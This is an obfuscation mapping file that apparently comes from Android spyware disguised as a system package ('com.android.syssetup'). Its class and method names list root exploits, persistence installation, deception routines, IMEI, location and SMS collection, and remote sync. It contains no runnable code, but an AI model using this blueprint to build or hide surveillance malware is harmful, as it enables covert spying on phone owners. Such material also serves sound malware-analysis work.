android.media.AmrInputStream -> android.media.AmrInputStream:
    2334:2334:java.lang.String d_5872108474803920914(java.lang.String) -> lE
    2337:2337:java.lang.String d_5172367141243990474(java.lang.String) -> lF
    2340:2340:java.lang.String d_4144427701446425393(java.lang.String) -> lG
    2343:2343:java.lang.String d_8105330909554255745(java.lang.String) -> lH
    2346:2346:java.lang.String d_6941801722412553411(java.lang.String) -> lI
    2349:2349:java.lang.String d_3602222868969547731(java.lang.String) -> lJ
    2352:2352:java.lang.String d_7694162037351981556(java.lang.String) -> lK
    2355:2355:java.lang.String d_6176432239999873773(java.lang.String) -> lL
    2358:2358:java.lang.String d_2555868936090211398(java.lang.String) -> lM
    2361:2361:java.lang.String d_3631927931378384062(java.lang.String) -> lN
    2364:2364:java.lang.String d_5056665511674469814(java.lang.String) -> lO
    2367:2367:java.lang.String d_1128867077890968343(java.lang.String) -> lP
    2370:2370:java.lang.String d_4843388768329069434(java.lang.String) -> lQ
    2373:2373:java.lang.String d_3746298564709198297(java.lang.String) -> lR
    2376:2376:java.lang.String d_7261419589087276227(java.lang.String) -> lS
    2379:2379:java.lang.String d_1220653025371005359(java.lang.String) -> lT
    2382:2382:java.lang.String d_348690263914679535(java.lang.String) -> lU
    2385:2385:java.lang.String d_77353042402731219(java.lang.String) -> lV
    2388:2388:java.lang.String d_1624536688143289576(java.lang.String) -> lW
    2391:2391:java.lang.String d_6999068624045849177(java.lang.String) -> lX
    2394:2394:java.lang.String d_3744308268714092368(java.lang.String) -> lY
    2397:2397:java.lang.String d_9100671877381285598(java.lang.String) -> lZ
    2400:2400:java.lang.String d_6326123926654287005(java.lang.String) -> ma
    2403:2403:java.lang.String d_4687915992304416226(java.lang.String) -> mb
    2406:2406:java.lang.String d_6117320752037966170(java.lang.String) -> mc
    2409:2409:java.lang.String d_9184426184347580737(java.lang.String) -> md
    2412:2412:java.lang.String d_7876107864655873250(java.lang.String) -> me
    2415:2415:java.lang.String d_4156450210143885573(java.lang.String) -> mf
    2418:2418:java.lang.String d_1494625092536483292(java.lang.String) -> mg
    2421:2421:java.lang.String d_1998439451495143494(java.lang.String) -> mh
    2424:2424:java.lang.String d_7389737494573552327(java.lang.String) -> mi
    2427:2427:java.lang.String d_3393545490703533227(java.lang.String) -> mj
    2430:2430:java.lang.String d_3769962847409841075(java.lang.String) -> mk
    2433:2433:java.lang.String d_2598240818704537295(java.lang.String) -> ml
    2436:2436:java.lang.String d_5500998962613556043(java.lang.String) -> mm
    2439:2439:java.lang.String d_5996311196392016933(java.lang.String) -> mn
    2442:2442:java.lang.String d_2981577265811499903(java.lang.String) -> mo
    2445:2445:java.lang.String d_7541206388334555383(java.lang.String) -> mp
    2448:2448:java.lang.String d_2644808286654444022(java.lang.String) -> mq
    2451:2451:java.lang.String d_7763374876288267379(java.lang.String) -> mr
    2454:2454:java.lang.String d_5641210629703421669(java.lang.String) -> ms
    2457:2457:java.lang.String d_3595096072279144282(java.lang.String) -> mt
    2460:2460:java.lang.String d_3655809056369106118(java.lang.String) -> mu
    2463:2463:java.lang.String d_1364518410231651411(java.lang.String) -> mv
    2466:2466:java.lang.String d_4815969349472387822(java.lang.String) -> mw
    2469:2469:java.lang.String d_7745154138260513654(java.lang.String) -> mx
    2472:2472:java.lang.String d_2509613327116270864(java.lang.String) -> my
    2475:2475:java.lang.String d_6802159815160724883(java.lang.String) -> mz
    2478:2478:java.lang.String d_7617687801011729477(java.lang.String) -> mA
    2481:2481:java.lang.String d_7490738433289513211(java.lang.String) -> mB
    2484:2484:java.lang.String d_4085639719405590374(java.lang.String) -> mC
    2487:2487:java.lang.String d_7999846331506442682(java.lang.String) -> mD
    2490:2490:java.lang.String d_6638216121806262885(java.lang.String) -> mE
    2493:2493:java.lang.String d_885520270631973681(java.lang.String) -> mF
    2496:2496:java.lang.String d_8780336253392945096(java.lang.String) -> mG
    2499:2499:java.lang.String d_1883440910028408076(java.lang.String) -> mH
    2502:2502:java.lang.String d_8409114296012149729(java.lang.String) -> mI
    2505:2505:java.lang.String d_8403525598578040386(java.lang.String) -> mJ
    2508:2508:java.lang.String d_4277496733200051752(java.lang.String) -> mK
    2511:2511:java.lang.String d_757975191242654409(java.lang.String) -> mL
    2514:2514:java.lang.String d_3361388262906588385(java.lang.String) -> mM
    2520:2520:java.lang.String d_8358899066372336952(java.lang.String) -> mN
    2523:2523:java.lang.String d_5488959230356795861(java.lang.String) -> mO
    2526:2526:java.lang.String d_6321708818496032960(java.lang.String) -> mP
    2529:2529:java.lang.String d_1920330045785391401(java.lang.String) -> mQ
    2532:2532:java.lang.String d_5428660957197866375(java.lang.String) -> mR
    2535:2535:java.lang.String d_7960762689632420453(java.lang.String) -> mS
    2538:2538:java.lang.String d_4396070994000287133(java.lang.String) -> mT
    2541:2541:java.lang.String d_8894595439103764131(java.lang.String) -> mU
    2544:2544:java.lang.String d_3897214567159895481(java.lang.String) -> mV
    2547:2547:java.lang.String d_572833302455117047(java.lang.String) -> mW
    2550:2550:java.lang.String d_2336847520582647242(java.lang.String) -> mX
    2553:2553:java.lang.String d_2759333068100388454(java.lang.String) -> mY
    2556:2556:java.lang.String d_4373722773630576347(java.lang.String) -> mZ
    2559:2559:java.lang.String d_2220260891783532632(java.lang.String) -> na
    2562:2562:java.lang.String d_8361170982223061550(java.lang.String) -> nb
    2565:2565:java.lang.String d_7869598386202098617(java.lang.String) -> nc
    2568:2568:java.lang.String d_5839458487270460769(java.lang.String) -> nd
    2571:2571:java.lang.String d_5410173196488676162(java.lang.String) -> ne
    2574:2574:java.lang.String d_6019850699479306635(java.lang.String) -> nf
    2577:2577:java.lang.String d_956328385193033614(java.lang.String) -> ng
    2580:2580:java.lang.String d_5956154148566816583(java.lang.String) -> nh
    2583:2583:java.lang.String d_1277571930544172403(java.lang.String) -> ni
    2586:2586:java.lang.String d_363926044369423629(java.lang.String) -> nj
    2589:2589:java.lang.String d_993656315517918966(java.lang.String) -> nk
    2592:2592:java.lang.String d_4723091795865023481(java.lang.String) -> nl
    2595:2595:java.lang.String d_6767186806513722085(java.lang.String) -> nm
    2598:2598:java.lang.String d_5344727705692548935(java.lang.String) -> nn
    2601:2601:java.lang.String d_3499764806535828970(java.lang.String) -> no
    2604:2604:java.lang.String d_5316550039339276394(java.lang.String) -> np
    2607:2607:java.lang.String d_8009428903750741957(java.lang.String) -> nq
    2610:2610:java.lang.String d_7216376831761993962(java.lang.String) -> nr
    2613:2613:java.lang.String d_6377248370498094196(java.lang.String) -> ns
    2616:2616:java.lang.String d_1341560403083600433(java.lang.String) -> nt
    2622:2622:java.lang.String d_3123057096425735741(java.lang.String) -> nu
    2625:2625:java.lang.String d_8671946625777175436(java.lang.String) -> nv
    2628:2628:java.lang.String d_9142177859088637077(java.lang.String) -> nw
    2631:2631:java.lang.String d_3722864338409349957(java.lang.String) -> nx
    2634:2634:java.lang.String d_7230013556406681026(java.lang.String) -> ny
    2637:2637:java.lang.String d_1561259245946092062(java.lang.String) -> nz
    2640:2640:java.lang.String d_4077518896198369681(java.lang.String) -> nA
    2643:2643:java.lang.String d_1010336822772115848(java.lang.String) -> nB
    2646:2646:java.lang.String d_4310899233710947116(java.lang.String) -> nC
    2649:2649:java.lang.String d_1639809172219565221(java.lang.String) -> nD
    2667:2667:java.lang.String d_2549929503110043048(java.lang.String) -> nE
    2691:2691:java.lang.String d_4602753710096940638(java.lang.String) -> nF
    2694:2694:java.lang.String d_3855395639789438031(java.lang.String) -> nG
    20:20:boolean getStatus() -> absolute
com.android.syssetup.Battery -> stt.and:
    int level -> level
    int scale -> and
    int temperature -> array
    int voltage -> asm
    23:23:int getBatteryLevel() -> and
    54:73:void playTone(int) -> absolute
    77:84:void vibrate() -> array
    87:90:void bip() -> asm
    93:96:void beep() -> begin
    107:111:void beepPenta() -> case
    114:117:void beepExit() -> const
com.android.syssetup.Broad -> com.android.syssetup.Broad:
    32:34:void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.syssetup.Call -> stt.array:
    java.lang.String number -> begin
    boolean incoming -> case
    boolean ongoing -> const
    boolean complete -> constructor
    java.util.Date timeBegin -> destructor
    java.util.Date timeEnd -> div
    boolean offhook -> do
    java.lang.String newState -> downto
    java.lang.String oldState -> else
    byte[] $ -> end
    45:45:java.lang.String getNumber() -> constructor
    49:52:java.lang.String getFrom() -> destructor
    57:60:java.lang.String getTo() -> getTo
    65:65:boolean isIncoming() -> div
    69:69:boolean isOngoing() -> do
    73:73:java.util.Date getTimeBegin() -> downto
    77:77:java.util.Date getTimeEnd() -> else
    85:90:void setComplete(boolean) -> absolute
    93:94:void setOngoing(boolean) -> and
    104:109:int getDuration() -> getDuration
    115:115:java.lang.String toString() -> toString
    121:121:boolean isOffhook() -> file
    125:126:void setOffhook() -> for
    129:132:boolean changedState() -> function
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.CellInfo -> stt.asm:
    int mcc -> mcc
    int mnc -> mnc
    int lac -> for
    int cid -> function
    int sid -> goto
    int nid -> if
    int bid -> implementation
    int rssi -> in
    boolean valid -> inherited
    boolean gsm -> inline
    boolean cdma -> interface
    byte[] $ -> end
    30:44:void setGsm$2e715812(int,int,int,int) -> absolute
    47:64:void setCdma$3b4dfe4b(int,int,int) -> and
    69:84:java.lang.String toString() -> toString
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.Connectivity -> stt.begin:
    boolean connected -> connected
    20:20:boolean isConnected() -> isConnected
    46:84:void statusActions() -> goto
    90:115:void statusModules() -> if
    121:146:void statusEvents() -> implementation
    152:170:void statusGlobals() -> in
com.android.syssetup.Core -> stt.case:
    boolean serviceRunning -> label
    boolean bStopCore -> mod
    java.lang.Thread coreThread -> nil
    android.content.ContentResolver contentResolver -> not
    com.android.syssetup.manager.ManagerModule moduleManager -> object
    com.android.syssetup.manager.ManagerEvent eventManager -> of
    java.lang.Thread fastQueueThread -> operator
    com.android.syssetup.Core$CheckAction checkActionFast -> or
    android.app.PendingIntent alarmIntent -> packed
    com.android.syssetup.SMain sMain -> procedure
    com.android.syssetup.Core singleton -> program
    byte[] $ -> end
    int $$ -> record
    96:100:com.android.syssetup.Core self() -> inherited
    107:110:void serivceUnregister() -> inline
    113:119:com.android.syssetup.Core newCore(com.android.syssetup.SMain) -> absolute
    134:246:boolean Start(android.content.res.Resources,android.content.ContentResolver) -> absolute
    250:252:void deceptionCode2(long) -> absolute
    255:257:void deceptionCode1() -> interface
    265:276:boolean Stop() -> label
    284:284:boolean iSR() -> iSR
    299:405:void run() -> run
    409:414:boolean checkActions() -> mod
    440:520:boolean checkActions(int) -> and
    529:561:void stopAll() -> nil
    572:655:int taskInit() -> not
    660:667:boolean verifyNewConf() -> object
    678:775:int loadConf() -> of
    779:809:boolean loadConfFile(com.android.syssetup.file.AutoFile,boolean) -> absolute
    820:891:int executeAction$60693190(com.android.syssetup.action.Action,com.android.syssetup.Trigger) -> absolute
    920:940:boolean reloadConf() -> operator
    950:973:boolean check() -> or
    979:991:boolean checkStatic() -> packed
    996:1000:boolean haveUninstallMarkup() -> procedure
    1007:1009:void createUninstallMarkup() -> program
    47:47:boolean access$000(com.android.syssetup.Core,int) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.Core$1 -> stt.const:
    com.android.syssetup.Core this$0 -> reintroduce
    158:159:void run() -> run
com.android.syssetup.Core$CheckAction -> stt.case$absolute:
    int queue -> repeat
    com.android.syssetup.Core this$0 -> reintroduce
    429:430:void run() -> run
com.android.syssetup.Device -> stt.constructor:
    com.android.syssetup.Device singleton -> self
    java.lang.String sdk -> set
    byte[] $ -> end
    42:50:com.android.syssetup.Device self() -> record
    61:73:java.lang.String getPhoneNumber() -> reintroduce
    77:81:boolean isPhoneNumber(java.lang.String) -> nH
    90:96:byte[] getVersion() -> repeat
    105:105:boolean isCdma() -> self
    109:109:boolean isGprs() -> set
    114:114:boolean isSimulator() -> shl
    126:144:java.lang.String getImei() -> shr
    156:171:java.lang.String getImsi() -> string
    175:243:com.android.syssetup.CellInfo getCellInfo() -> then
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.GeneralException -> stt.destructor:
com.android.syssetup.LinuxExploitThread -> stt.div:
    boolean frama -> shl
    boolean selinux -> shr
    boolean towel -> string
    java.util.concurrent.Semaphore semaphore -> then
    byte[] $ -> end
    int $$ -> record
    41:92:void run() -> run
    96:130:void runFramalinuxExploit() -> to
    141:145:boolean pidAlive(java.lang.String) -> nI
    162:184:boolean pidSeExAlive(java.lang.String) -> nJ
    197:241:java.lang.String pidOf(java.lang.String) -> nK
    244:305:void runSelinuxExploit() -> type
    310:371:void runTowelExploit() -> unit
    376:398:boolean checkSelinuxExecution(java.lang.String) -> nL
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.MessagesDecrypt -> stt.do:
    byte[] $ -> end
    104:134:javax.crypto.SecretKey produceKey(java.lang.String) -> nM
    java.lang.String $$24d420ae() -> until
com.android.syssetup.Packet -> stt.downto:
    int type -> type
    int command -> to
    long id -> id
    byte[] data -> unit
    byte[] additional -> until
    java.util.ArrayList items -> uses
    int dataLen -> var
    85:85:long getId() -> getId
    95:96:void setCommand(int) -> array
    104:104:int getCommand() -> uses
    115:116:void setType(int) -> setType
    124:124:int getType() -> getType
    134:136:void setData(byte[]) -> setData
    139:142:void setData(byte[],int) -> absolute
    150:150:byte[] getData() -> getData
    154:154:int getDataLength() -> var
    163:163:byte[] getAdditional() -> while
    173:174:void setAdditional(byte[]) -> absolute
    178:178:java.util.ArrayList getItems() -> with
com.android.syssetup.ProcessInfo -> stt.else:
    java.lang.String processInfo -> while
    com.android.syssetup.ProcessStatus status -> with
    30:30:java.lang.String toString() -> toString
com.android.syssetup.ProcessStatus -> stt.end:
    com.android.syssetup.ProcessStatus START -> xor
    com.android.syssetup.ProcessStatus STOP -> a
    com.android.syssetup.ProcessStatus[] $VALUES -> b
    12:12:com.android.syssetup.ProcessStatus[] values() -> values
    12:12:com.android.syssetup.ProcessStatus valueOf(java.lang.String) -> valueOf
com.android.syssetup.Root -> stt.file:
    java.lang.String method -> method
    java.util.Date startExploiting -> c
    int askedSu -> d
    java.lang.String SU -> e
    java.util.concurrent.Semaphore semGetPermission -> f
    com.android.syssetup.evidence.Markup markup -> g
    java.lang.String[] appToDisable -> h
    byte[] $ -> end
    int $$ -> record
    66:83:boolean installed(java.lang.String) -> nN
    139:219:boolean exploitPhone(boolean) -> array
    224:225:boolean isArtInUse() -> xor
    230:275:void adjustOom() -> a
    317:320:void addOldFileMarkup(java.lang.String) -> nO
    323:335:void delOldFileMarkup(java.lang.Boolean) -> absolute
    338:433:boolean uninstallRoot() -> b
    438:516:boolean installPersistence(java.lang.Boolean) -> and
    522:541:void supersuRoot() -> c
    545:592:void standardShell() -> d
    598:643:void selinuxShell() -> e
    691:704:boolean checkCyanogenmod() -> f
    708:749:boolean checkFramarootExploitability() -> g
    754:791:boolean checkSELinuxExploitability() -> h
    797:834:boolean checkTowelExploitability() -> i
    839:860:void checkExploitThread(java.lang.Thread,int) -> absolute
    869:874:void installPersistence() -> j
    902:934:void linuxExploit(boolean,boolean,boolean,boolean) -> absolute
    939:939:boolean createScript(java.lang.String,java.lang.String) -> absolute
    943:963:boolean createScript(java.lang.String,java.lang.String,java.lang.String) -> absolute
    990:1002:void removeScript(java.lang.String) -> nP
    1012:1076:boolean getPermissions(boolean) -> asm
    1083:1107:java.io.InputStream decodeEnc(java.io.InputStream,java.lang.String) -> absolute
    51:51:void access$000(java.lang.Thread,int) -> and
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.Root$1CET -> stt.for:
    java.lang.Thread exploit -> i
    887:897:void run() -> run
com.android.syssetup.RunningProcesses -> stt.function:
    com.android.syssetup.RunningProcesses instance -> j
    java.lang.String foreground -> k
    android.app.ActivityManager activityManager -> l
    34:37:com.android.syssetup.RunningProcesses self() -> k
    41:50:java.lang.String getForeground_L() -> l
    54:62:java.lang.String getForeground() -> m
    66:78:java.lang.String getForeground_wrapper() -> n
com.android.syssetup.SMain -> com.android.syssetup.SMain:
    com.android.syssetup.listener.BSt bst -> m
    com.android.syssetup.listener.BAc bac -> n
    com.android.syssetup.listener.BSm bsm -> o
    com.android.syssetup.listener.BC bc -> p
    com.android.syssetup.listener.WR wr -> q
    java.lang.Boolean listenersRegistered -> r
    com.android.syssetup.Core core -> s
    long mersenne -> t
    byte[] $ -> end
    39:39:android.os.IBinder onBind(android.content.Intent) -> onBind
    44:73:void onCreate() -> onCreate
    76:87:long deceptionCode3() -> o
    92:102:boolean isPrime(long) -> and
    107:143:void onStart(android.content.Intent,int) -> onStart
    147:161:void onDestroy() -> onDestroy
    165:188:void registerReceivers() -> p
    194:209:void unregisterReceiver() -> q
    212:213:void stopListening() -> stopListening
    217:223:void onConfigurationChanged(android.content.res.Configuration) -> onConfigurationChanged
    227:233:void onLowMemory() -> onLowMemory
    237:242:void onRebind(android.content.Intent) -> onRebind
    246:252:boolean onUnbind(android.content.Intent) -> onUnbind
    24:24:long access$000$6e20c09d() -> r
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.SMain$1 -> stt.goto:
    com.android.syssetup.SMain this$0 -> u
    135:138:void run() -> run
com.android.syssetup.Sim -> stt.if:
    java.lang.String imsi -> v
    20:20:java.lang.String getImsi() -> string
    27:37:byte[] SHA1$7dcc7401(byte[],int) -> and
    56:66:byte[] MD5$7dcc7401(byte[],int) -> array
    77:77:byte[] SHA1(byte[]) -> and
    81:81:java.lang.String SHA1(java.lang.String) -> nQ
    92:92:byte[] MD5(byte[]) -> array
    96:96:java.lang.String MD5(java.lang.String) -> nR
    106:109:long CRC32(byte[]) -> asm
com.android.syssetup.Standby -> stt.implementation:
    boolean status -> absolute
    20:20:boolean getStatus() -> absolute
    28:28:boolean isScreenOff() -> s
    214:214:java.lang.String getMemo$47921032() -> t
com.android.syssetup.Status -> stt.in:
    java.util.HashMap modulesMap -> w
    java.util.HashMap eventsMap -> x
    java.util.HashMap actionsMap -> y
    com.android.syssetup.conf.Globals globals -> z
    java.util.ArrayList[] triggeredActions -> A
    boolean synced -> B
    int drift -> C
    android.content.Context context -> D
    java.lang.Object lockCrisis -> E
    boolean crisis -> F
    boolean[] crisisType -> G
    boolean haveRoot -> H
    boolean haveSu -> I
    java.lang.Object[] triggeredSemaphore -> J
    boolean uninstall -> K
    android.os.PowerManager$WakeLock wl -> L
    java.lang.Object uninstallLock -> M
    java.util.Date startedTime -> N
    boolean deviceAdmin -> O
    int haveCamera -> P
    boolean reload -> Q
    boolean wifiConnected -> R
    boolean gsmConnected -> S
    int exploitStatus -> T
    int exploitResult -> U
    java.lang.String persistencyPackage -> V
    java.lang.String persistencyApk -> W
    int persistencyStatus -> X
    com.android.syssetup.RunningProcesses runningProcess -> Y
    java.lang.Object lockFramebuffer -> Z
    com.android.syssetup.Status singleton -> aa
    android.os.Handler deafultHandler -> ab
    byte[] $ -> end
    int $$ -> record
    174:182:com.android.syssetup.Status self() -> u
    189:196:void clean() -> v
    213:219:void setAppContext(android.content.Context) -> absolute
    231:231:android.content.Context getAppContext() -> w
    247:247:boolean isGuiVisible() -> x
    251:251:android.content.ContentResolver getContentResolver() -> getContentResolver
    256:256:android.os.Handler getDefaultHandler() -> y
    268:281:void addModule$239843e6(com.android.syssetup.conf.ChildConf) -> absolute
    297:305:boolean addEvent(com.android.syssetup.conf.ConfEvent) -> absolute
    322:323:void addAction(com.android.syssetup.action.Action) -> absolute
    326:326:int getExploitStatus() -> z
    330:331:void setExploitStatus(int) -> asm
    338:339:void setExploitResult(int) -> begin
    343:355:java.lang.String getExploitStatusString() -> A
    359:371:java.lang.String getExploitResultString() -> B
    376:377:void setGlobal(com.android.syssetup.conf.Globals) -> absolute
    385:385:int getActionsNumber() -> C
    403:403:int getEventsNumber() -> D
    412:412:java.util.HashMap getModulesMap() -> E
    421:421:java.util.HashMap getEventsMap() -> F
    441:451:com.android.syssetup.action.Action getAction(int) -> case
    462:472:com.android.syssetup.conf.ConfEvent getEvent(int) -> const
    480:480:com.android.syssetup.conf.Globals getGlobals() -> G
    495:533:void triggerAction(int,com.android.syssetup.event.BaseEvent) -> absolute
    546:588:com.android.syssetup.Trigger[] getTriggeredActions(int) -> constructor
    617:640:void unTriggerAction(com.android.syssetup.action.Action) -> and
    651:674:void unTriggerAll() -> H
    677:679:void setCrisis$2563266(int) -> destructor
    687:689:boolean isCrisis() -> I
    693:695:boolean crisisPosition() -> J
    711:713:boolean crisisMic() -> K
    717:719:boolean crisisSync() -> L
    726:728:void startCrisis() -> M
    735:737:void stopCrisis() -> N
    741:741:boolean haveRoot() -> O
    745:746:void setRoot(boolean) -> begin
    749:749:boolean haveSu() -> P
    753:754:void setSu(boolean) -> case
    757:757:java.util.concurrent.ScheduledExecutorService getStpe() -> Q
    768:772:void acquirePowerLock() -> R
    787:788:void setDeviceAdmin(boolean) -> const
    791:791:boolean haveAdmin() -> S
    795:811:void makeToast(java.lang.String) -> nS
    814:815:void setReload() -> T
    818:818:boolean wantsReload() -> U
    822:823:void unsetReload() -> V
    826:826:java.lang.String getForeground() -> m
    845:865:boolean checkCameraHardware() -> W
    873:873:void setIconState$171db248() -> X
    916:926:android.content.pm.PackageInfo getMyPackageInfo() -> Y
    931:934:boolean haveCamera() -> Z
    944:950:java.lang.Boolean needReboot() -> aa
    954:958:java.lang.String getApkName() -> ab
    962:966:java.lang.String getAppDir() -> ac
    974:978:java.lang.Boolean isPersistent() -> ad
    986:996:java.lang.Boolean persistencyReady() -> ae
    1000:1001:void setPersistencyStatus(int) -> div
    1004:1004:int getPersistencyStatus() -> af
    1008:1024:java.lang.String getPersistencyStatusStr() -> ag
    1029:1032:boolean isMelt() -> ah
    1049:1049:boolean isBlackberry() -> ai
    45:45:android.content.Context access$000() -> aj
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.Status$1 -> stt.inherited:
    java.lang.String val$message -> ac
    com.android.syssetup.Status this$0 -> ad
    802:803:void run() -> run
com.android.syssetup.ThreadBase -> stt.inline:
    long period -> period
    long delay -> ae
    boolean stopRequest -> af
    boolean suspended -> ag
    int status$bf2c024 -> ah
    void actualGo() -> ak
    void actualStart() -> al
    void actualStop() -> am
    70:115:void run() -> run
    124:196:void loop() -> loop
    203:206:void next() -> an
    213:217:void stopThread() -> ao
    220:220:boolean isStopRequested() -> ap
    233:235:void setPeriod(long) -> array
    247:249:void setDelay(long) -> asm
    261:261:boolean isRunning() -> isRunning
    265:269:void suspend() -> suspend
    272:277:void resume() -> resume
    283:283:boolean isSuspended() -> aq
com.android.syssetup.Trigger -> stt.interface:
    int actionId -> actionId
    java.lang.ref.WeakReference event -> ai
    17:17:int getActionId() -> ar
    26:29:boolean equals(java.lang.Object) -> equals
    35:35:int hashCode() -> hashCode
com.android.syssetup.action.Action -> stt.label:
    java.util.ArrayList list$7865b31 -> aj
    int actionId -> actionId
    java.lang.String desc -> ak
    int queue -> repeat
    74:74:int getId() -> getId
    83:83:int getSubActionsNum() -> as
    99:122:boolean addSubAction(com.android.syssetup.conf.ConfAction) -> absolute
    127:128:void setQueue$13462e() -> at
    149:153:com.android.syssetup.action.SubAction getSubAction(int) -> do
    157:157:com.android.syssetup.action.SubAction[] getSubActions() -> au
    161:161:int getQueue() -> av
    172:172:java.lang.String toString() -> toString
com.android.syssetup.action.DestroyAction -> stt.mod:
    boolean permanent -> al
    byte[] $ -> end
    int $$ -> record
    30:34:boolean parse(com.android.syssetup.conf.ConfAction) -> and
    41:55:boolean execute(com.android.syssetup.Trigger) -> absolute
    59:75:void destroyUser() -> aw
    80:88:void destroyAdmin() -> ax
    91:92:void destroyRoot() -> ay
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.action.DisableEventAction -> stt.nil:
    22:27:boolean execute(com.android.syssetup.Trigger) -> absolute
com.android.syssetup.action.EnableEventAction -> stt.not:
    22:27:boolean execute(com.android.syssetup.Trigger) -> absolute
com.android.syssetup.action.EventAction -> stt.object:
    int eventId -> am
    19:32:boolean parse(com.android.syssetup.conf.ConfAction) -> and
com.android.syssetup.action.ExecuteAction -> stt.of:
    java.lang.String command -> an
    47:64:boolean parse(com.android.syssetup.conf.ConfAction) -> and
    76:96:boolean execute(com.android.syssetup.Trigger) -> absolute
com.android.syssetup.action.LogAction -> stt.operator:
    java.lang.String msg -> ao
    47:49:boolean execute(com.android.syssetup.Trigger) -> absolute
    56:68:boolean parse(com.android.syssetup.conf.ConfAction) -> and
com.android.syssetup.action.ModuleAction -> stt.or:
    java.lang.String moduleId -> ap
    java.lang.String moduleStr -> aq
    byte[] $ -> end
    42:54:boolean parse(com.android.syssetup.conf.ConfAction) -> and
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.action.SmsAction -> stt.packed:
    android.telephony.SmsManager sm -> ar
    java.lang.String number -> begin
    java.lang.String text -> as
    int type -> type
    java.lang.String descrType -> at
    byte[] $ -> end
    int $$ -> record
    70:135:boolean parse(com.android.syssetup.conf.ConfAction) -> and
    159:183:boolean execute(com.android.syssetup.Trigger) -> absolute
    192:195:void errorLocation() -> az
    203:217:boolean getCellPosition() -> aA
    224:227:void getGPSPosition() -> aB
    236:242:void sendSMS(java.lang.String) -> nT
    252:258:java.lang.String toString() -> toString
    264:291:void onLocationChanged(android.location.Location) -> onLocationChanged
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.action.StartModuleAction -> stt.procedure:
    44:47:boolean execute(com.android.syssetup.Trigger) -> absolute
com.android.syssetup.action.StopModuleAction -> stt.program:
    30:33:boolean execute(com.android.syssetup.Trigger) -> absolute
com.android.syssetup.action.SubAction -> stt.record:
    java.lang.String startStr -> au
    java.lang.String stopStr -> av
    com.android.syssetup.conf.ConfAction conf -> aw
    com.android.syssetup.Status status -> ax
    boolean finished -> ay
    boolean stop -> az
    byte[] $ -> end
    int $$ -> record
    69:156:com.android.syssetup.action.SubAction factory(java.lang.String,com.android.syssetup.conf.ConfAction) -> absolute
    boolean parse(com.android.syssetup.conf.ConfAction) -> and
    boolean execute(com.android.syssetup.Trigger) -> absolute
    198:202:void prepareExecute() -> aC
    210:210:java.lang.String toString() -> toString
    215:215:boolean considerStop() -> aD
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.action.SubActionSlow -> stt.reintroduce:
com.android.syssetup.action.SyncAction -> stt.repeat:
    com.android.syssetup.evidence.EvidenceCollector logCollector -> aA
    com.android.syssetup.manager.ManagerModule moduleManager -> object
    java.util.Vector transports -> aB
    com.android.syssetup.action.sync.ZProtocol protocol$56af054a -> aC
    boolean initialized -> aD
    byte[] $ -> end
    87:195:boolean execute(com.android.syssetup.Trigger) -> absolute
    boolean initTransport() -> aE
    java.lang.String $$24d420ae() -> until
com.android.syssetup.action.SyncActionApn -> stt.self:
    39:39:boolean execute(com.android.syssetup.Trigger) -> absolute
    45:45:boolean parse(com.android.syssetup.conf.ConfAction) -> and
com.android.syssetup.action.SyncActionInternet -> stt.set:
    boolean wifiForced -> aE
    boolean wifi -> aF
    boolean gprs -> aG
    java.lang.String host -> aH
    byte[] $ -> end
    58:100:boolean parse(com.android.syssetup.conf.ConfAction) -> and
    110:130:boolean initTransport() -> aE
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.action.UninstallAction -> stt.shl:
    byte[] $ -> end
    59:60:boolean execute(com.android.syssetup.Trigger) -> absolute
    70:107:boolean actualExecute() -> aF
    111:127:boolean removeRoot() -> aG
    135:153:void removeAdmin(android.content.Context) -> and
    165:169:boolean stopServices() -> aH
    182:188:boolean removeFiles() -> aI
    192:214:boolean deleteApplication() -> aJ
    226:241:boolean deleteApplicationIntent() -> aK
    250:260:boolean deleteApplicationRoot() -> aL
    265:265:boolean parse(com.android.syssetup.conf.ConfAction) -> and
